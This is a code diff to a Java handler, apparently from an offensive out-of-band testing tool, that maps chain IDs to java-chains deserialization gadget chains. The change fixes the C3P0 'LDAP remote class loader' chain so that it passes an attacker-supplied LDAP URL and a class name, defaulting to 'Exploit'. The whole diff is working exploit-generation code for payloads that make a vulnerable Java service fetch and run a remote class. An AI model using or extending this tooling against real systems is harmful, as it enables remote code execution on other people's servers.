@@ -57,8 +57,13 @@ public class JavaChainsProxyHandler implements ChainHandler {
         String payloadName,
         List<String> gadgets,
         boolean jndiMode,          // true → map jndi_url→jndiUrl; false → map cmd→command
+        boolean ldapMode,          // true → map jndi_url→url+className (LdapClassLoader)
         String outContentType      // used when encode="disable" (text payloads)
-    ) {}
+    ) {
+        ChainDef(String payloadName, List<String> gadgets, boolean jndiMode, String outContentType) {
+            this(payloadName, gadgets, jndiMode, false, outContentType);
+        }
+    }
 
     // ── OOBserver chain ID → java-chains chain config ─────────────────────────
     private static final Map<String, ChainDef> CHAIN_MAP;
@@ -318,11 +323,11 @@ public class JavaChainsProxyHandler implements ChainHandler {
 
         // ── JavaNative: C3P0 ──────────────────────────────────────────────────
 
-        // C3P0 LDAP remote class loader
+        // C3P0 LDAP remote class loader — needs url+className params, not jndiUrl
         m.put("jchains_native_c3p0_ldap",
             new ChainDef("JavaNativePayload",
                 List.of("MchangeC3p0Reference", "LdapClassLoader"),
-                true, "application/octet-stream"));
+                false, true, "application/octet-stream"));
 
         // C3P0 Tomcat EL exec
         m.put("jchains_native_c3p0_el",
@@ -412,7 +417,16 @@ public class JavaChainsProxyHandler implements ChainHandler {
 
         // Build java-chains params (key names match java-chains gadget param fields)
         Map<String, String> jcParams;
-        if (def.jndiMode()) {
+        if (def.ldapMode()) {
+            // LdapClassLoader needs url + className (last path component of LDAP URL)
+            if (jndiUrl.isEmpty()) {
+                return new PayloadResult("application/octet-stream", new byte[0],
+                    Map.of("error", "jndi_url required for LDAP ClassLoader chain: " + chainId));
+            }
+            String className = jndiUrl.contains("/")
+                ? jndiUrl.substring(jndiUrl.lastIndexOf('/') + 1) : "Exploit";
+            jcParams = Map.of("url", jndiUrl, "className", className);
+        } else if (def.jndiMode()) {
             if (jndiUrl.isEmpty()) {
                 return new PayloadResult("application/octet-stream", new byte[0],
                     Map.of("error", "jndi_url required for JNDI chain: " + chainId));
